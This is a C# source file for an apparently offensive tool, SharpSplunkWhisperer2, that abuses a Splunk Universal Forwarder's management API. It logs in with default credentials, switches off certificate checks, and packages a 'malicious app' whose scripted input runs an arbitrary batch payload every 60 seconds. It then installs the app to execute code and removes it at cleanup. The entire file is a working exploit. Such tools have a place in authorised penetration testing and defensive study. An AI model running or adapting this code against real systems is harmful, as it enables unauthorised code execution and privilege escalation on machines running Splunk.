using System;
using System.IO;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using Splunk.Client;
using ICSharpCode.SharpZipLib.Tar;
using CommandLine;

namespace SharpSplunkWhisperer2
{
    class SharpSplunkWhisperer2
    {
        static readonly string SPLUNK_APP_NAME = "_PWN_APP_";

        static void Main(string[] args)
        {
            if (args == null)
                throw new ArgumentNullException(nameof(args));

            Options options = new Options();
            var result = Parser.Default.ParseArguments<Options>(args)
                .WithParsed(o =>
                {
                    Run(o).Wait(); // required since Splunk library is async
                });

            Console.Write("Press RETURN to exit...");
            Console.ReadLine();
        }

        public async static Task Run(Options options)
        {
            // most recent Splunk Universal Forwarder only accepts TLS 1.2 by default
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12 | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls;
            // Splunk UF default certificate is self-signed and therefore invalid, we choose to ignore it
            ServicePointManager.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) =>
            {
                return true;
            };

            Uri uri = new Uri(options.Scheme + "://localhost:" + options.Port);
            Console.WriteLine("[.] Connecting to target: " + uri + " with credentials : " + options.UserName + " / " + options.Password);

            var service = new Service(uri);
            try
            {
                await service.LogOnAsync(options.UserName, options.Password);
            }
            catch (AuthenticationFailureException ex)
            {
                Console.WriteLine("[-] Authentication failure!");
                Console.WriteLine(ex.Message);
                return;
            }

            Console.WriteLine("[+] Connected");

            Console.WriteLine("[.] Creating malicious app archive...");

            DirectoryInfo tempDirectory = Directory.CreateDirectory(Path.Combine(Path.GetTempPath(), Path.GetRandomFileName()));

            DirectoryInfo rootApp = tempDirectory.CreateSubdirectory(SPLUNK_APP_NAME);

            DirectoryInfo bin = rootApp.CreateSubdirectory("bin");
            File.WriteAllText(Path.Combine(bin.FullName, "pwn.bat"), options.Payload);

            DirectoryInfo local = rootApp.CreateSubdirectory("local");
            File.WriteAllText(Path.Combine(local.FullName, "inputs.conf"), @"[script://$SPLUNK_HOME/etc/apps/" + SPLUNK_APP_NAME + @"/bin/pwn.bat]
disabled = false
index = default
interval = 60.0
sourcetype = test
");

            string appFile = tempDirectory.FullName + ".tar";

            Stream outStream = File.Create(appFile);
            TarArchive tarArchive = TarArchive.CreateOutputTarArchive(outStream);
            // from https://github.com/icsharpcode/SharpZipLib/wiki/GZip-and-Tar-Samples
            tarArchive.RootPath = tempDirectory.FullName.Replace('\\', '/').TrimEnd('/');
            AddDirectoryFilesToTar(tarArchive, tempDirectory.FullName);
            tarArchive.Close();

            tempDirectory.Delete(true);
            Console.WriteLine("[+] Malicious app archive ready");

            Console.WriteLine("[.] Installing app...");
            Application app = null;
            try
            {
                app = await service.Applications.InstallAsync(appFile);
                Console.WriteLine("[+] App installed! Your code should be running now.");
            }
            catch (RequestException ex)
            {
                // can happen if the application is already installed
                Console.WriteLine("[-] Exception caught: ");
                Console.WriteLine(ex.Message);
            }
            finally
            {
                Console.Write("Press RETURN to cleanup...");
                Console.ReadLine();
                Console.WriteLine();

                File.Delete(appFile);
                Console.WriteLine("[+] Deleted " + appFile);

                if (app == null)
                {
                    // there was an error when installing the app so let's find it to be able to remove it
                    Application app2 = await service.Applications.GetOrNullAsync(SPLUNK_APP_NAME);
                    if (app2 != null)
                    {
                        Console.WriteLine("[.] Removing app...");
                        await app2.RemoveAsync();
                        Console.WriteLine("[+] App removed");
                    }
                }
                else
                {
                    Console.WriteLine("[.] Removing app...");
                    await app.RemoveAsync();
                    Console.WriteLine("[+] App removed");
                }
            }
        }

        // from https://github.com/icsharpcode/SharpZipLib/wiki/GZip-and-Tar-Samples
        private static void AddDirectoryFilesToTar(TarArchive tarArchive, string sourceDirectory)
        {
            // Write each file to the tar.
            string[] filenames = Directory.GetFiles(sourceDirectory);
            foreach (string filename in filenames)
            {
                TarEntry tarEntry = TarEntry.CreateEntryFromFile(filename);
                tarArchive.WriteEntry(tarEntry, true);
            }

            string[] directories = Directory.GetDirectories(sourceDirectory);
            foreach (string directory in directories)
                AddDirectoryFilesToTar(tarArchive, directory);
        }
    }


    public class Options
    {
        [Option(Default = "admin")]
        public string UserName { get; set; }

        [Option(Default = "changeme")]
        public string Password { get; set; }

        [Option(Default = 8089)]
        public int Port { get; set; }

        [Option(Default = "https")]
        public string Scheme { get; set; }

        [Option(Default = "calc.exe")]
        public string Payload { get; set; }
    }
}
